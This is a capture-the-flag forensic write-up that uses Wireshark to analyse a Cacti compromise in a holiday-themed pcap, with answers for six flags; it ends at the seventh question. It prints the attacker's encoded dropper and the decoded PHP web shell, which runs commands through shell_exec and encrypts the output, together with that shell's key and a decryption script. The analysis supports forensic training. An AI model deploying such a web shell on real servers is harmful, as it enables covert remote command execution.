# A Trail of Snow and Deception
## Difficulty: easy
> Oliver Mirth, Tinselwick's forensic expert, crouched by the glowing lantern post, tracing the shimmerdust trail with a gloved finger. It led into the snowdrifts, then disappeared, no footprints, no sign of a struggle. He glanced up at the flickering Snowglobe atop Sprucetop Tower, its light wavering like a fading star. "Someone’s been tampering with the magic," Oliver murmured. "But why?" He straightened, eyes narrowing. The trail might be gone, but the mystery was just beginning. Can Oliver uncover the secret behind the fading glow?

In this challenge, we are going to look for 7 flags.
Download the pcap file and open it on Wireshark to start the analysis.

# Flag 1
### What is the Cacti version in use? (e.g. 7.1.0)

Enter the wireshark filter: `http contains "version"`


<img width="646" height="714" alt="Screenshot at 2025-12-26 14-36-46" src="https://github.com/user-attachments/assets/87fa098c-db52-4cc3-a084-7fa700a58264" />

# Flag 2
### What is the set of credentials used to log in to the instance? (e.g., username:password)
Enter filter: `http contains "password"`

<img width="454" height="688" alt="Screenshot at 2025-12-26 14-56-48" src="https://github.com/user-attachments/assets/a807083a-722f-470d-bafd-4ca29c7d1ccd" />

Flag: `marnie.thistlewhip:Z4ZP_8QzKA`

# Flag 3
### Three malicious PHP files are involved in the attack. In order of appearance in the network stream, what are they? (e.g., file1.php,file2.php,file3.php)

Enter filter: `http.request.method == "GET" && http.request.uri contains ".php"`

Then look for any sign of suspicious `.php` file. Scroll down and there are some unordinary named php file:

<img width="949" height="428" alt="Screenshot at 2025-12-26 15-54-15" src="https://github.com/user-attachments/assets/5e124819-e507-4c1e-8e07-4f7b900c624f" />

```
GET /cacti/JWUA5a1yj.php HTTP/1.1\r\n
GET /cacti/ornF85gfQ.php HTTP/1.1
GET /cacti/f54Avbg4.php?q=aWQ= HTTP/1.1
```

Flag: `JWUA5a1yj.php,ornF85gfQ.php,f54Avbg4.php`

# Flag 4
### What file gets downloaded using curl during exploitation process? (e.g. filename)

<img width="1114" height="274" alt="Screenshot at 2025-12-26 16-02-12" src="https://github.com/user-attachments/assets/0b432d6c-3d44-4614-8d4e-65417b11ded3" />

<img width="738" height="716" alt="Screenshot at 2025-12-26 16-18-19" src="https://github.com/user-attachments/assets/74109762-5c24-4a0b-b131-2c895a167997" />

Flag: `bash`

# Flag 5
### What is the name of the variable in one of the three malicious PHP files that stores the result of the executed system command? (e.g., $q5ghsA)
If we try to decode the following injected shell script:

```
#!/bin/bash
echo PD9waHAgJEE0Z1ZhR3pIID0gImtGOTJzTDBwUXc4ZVR6MTdhQjR4TmM5VlVtM3lIZDZHIjskQTRnVmFSbVYgPSAicFo3cVIxdEx3OERmM1hiSyI7JEE0Z1ZhWHpZID0gYmFzZTY0X2RlY29kZSgkX0dFVFsicSJdKTskYTU0dmFnID0gc2hlbGxfZXhlYygkQTRnVmFYelkpOyRBNGdWYVFkRiA9IG9wZW5zc2xfZW5jcnlwdCgkYTU0dmFnLCJBRVMtMjU2LUNCQyIsJEE0Z1ZhR3pILE9QRU5TU0xfUkFXX0RBVEEsJEE0Z1ZhUm1WKTtlY2hvIGJhc2U2NF9lbmNvZGUoJEE0Z1ZhUWRGKTsgPz4=|base64 --decode > f54Avbg4.php
```

We will get this decoded php script:
```
<?php $A4gVaGzH = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G";$A4gVaRmV = "pZ7qR1tLw8Df3XbK";$A4gVaXzY = base64_decode($_GET["q"]);$a54vag = shell_exec($A4gVaXzY);$A4gVaQdF = openssl_encrypt($a54vag,"AES-256-CBC",$A4gVaGzH,OPENSSL_RAW_DATA,$A4gVaRmV);echo base64_encode($A4gVaQdF); ?>
```

Analyzing it further tells us that the variable `$a54vag` executes the shell commands of the variable `$A4gVaXzY` which decodes the base64 script with the `q` request.

Flag: `$a54vag`

# Flag 6
### What is the system machine hostname? (e.g. server01)
Decoding the previous trail of `f54Avbg4.php` leds us to these bash commands:

<img width="1340" height="666" alt="image" src="https://github.com/user-attachments/assets/a07287bc-879d-403e-a2a9-1da15867a777" />


Now we need to look for the server's response:

<img width="741" height="717" alt="Screenshot at 2025-12-26 17-16-32" src="https://github.com/user-attachments/assets/e8b1a0d9-94b1-45c0-bcc0-dcb37b6491af" />

```
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
```

If you remember the previous file `f54Avbg4.php`, it provided the key and also the encryption/decryption processes. Let's look at the cleaner version:

```
$key = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G";   // 32 bytes
$iv  = "pZ7qR1tLw8Df3XbK";                  // 16 bytes

$input = base64_decode($_GET["q"]);
$output = openssl_encrypt(
    shell_exec($input),
    "AES-256-CBC",
    $key,
    OPENSSL_RAW_DATA,
    $iv
);
echo base64_encode($output);
```

Let's use the generated script of ChatGPT to decrypt the long encrypted string:
```
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

ciphertext_b64 = """PASTE_THE_BIG_BASE64_STRING_HERE"""

key = b"kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G"
iv  = b"pZ7qR1tLw8Df3XbK"

ciphertext = b64decode(ciphertext_b64)

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)

print(plaintext.decode(errors="ignore"))
```

# Flag 7
### What is the database password used by Cacti? (e.g. Password123)
